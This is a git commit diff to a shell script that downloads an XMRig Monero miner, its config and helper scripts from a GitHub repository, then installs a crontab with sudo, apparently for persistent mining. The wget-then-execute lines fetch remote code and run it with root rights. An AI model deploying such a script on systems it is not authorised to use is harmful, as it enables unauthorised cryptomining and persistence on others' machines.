09b20c07f119f26676c7924c53ab94ef49168a20
hnv123 <95834869+hnv123@users.noreply.github.com>
2022-04-27 14:12:21 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,14 +1,14 @@
 cd /home/ubuntu
 
-wget https://raw.githubusercontent.com/659678/567580/main/xmrig1804.tar.gz
+wget https://raw.githubusercontent.com/hnv123/xmr/main/xmrig1804.tar.gz
 tar zxvf xmrig1804.tar.gz
 mv xmrig-6.15.2 xmrig1804
 cd xmrig1804/
 rm -f config.json
-wget https://raw.githubusercontent.com/659678/567580/main/xmr_r.sh
-wget https://raw.githubusercontent.com/659678/567580/main/xmr_j.sh
-wget https://raw.githubusercontent.com/659678/567580/main/xmr_cr.sh
-wget https://raw.githubusercontent.com/659678/567580/main/config.json
+wget https://raw.githubusercontent.com/hnv123/xmr/main/xmr_r.sh
+wget https://raw.githubusercontent.com/hnv123/xmr/main/xmr_j.sh
+wget https://raw.githubusercontent.com/hnv123/xmr/main/xmr_cr.sh
+wget https://raw.githubusercontent.com/hnv123/xmr/main/config.json
 chmod +x *
 echo "Start Install Crontab"
 sudo sh /home/ubuntu/xmrig1804/xmr_cr.sh
